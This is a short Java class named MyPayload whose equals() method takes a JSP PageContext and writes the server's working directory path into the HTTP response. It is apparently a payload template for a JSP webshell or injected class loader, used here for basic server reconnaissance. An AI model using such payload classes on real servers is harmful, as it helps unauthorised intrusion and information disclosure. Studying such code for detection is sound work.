import java.io.File;
import javax.servlet.jsp.PageContext;

public class MyPayload {
    public boolean equals(Object obj) {
        PageContext page = (PageContext) obj;
        try {
            page.getResponse().getWriter().println(new File("").getAbsolutePath());
        } catch (Exception e) {
            e.printStackTrace();
        }
        return true;
    }
}
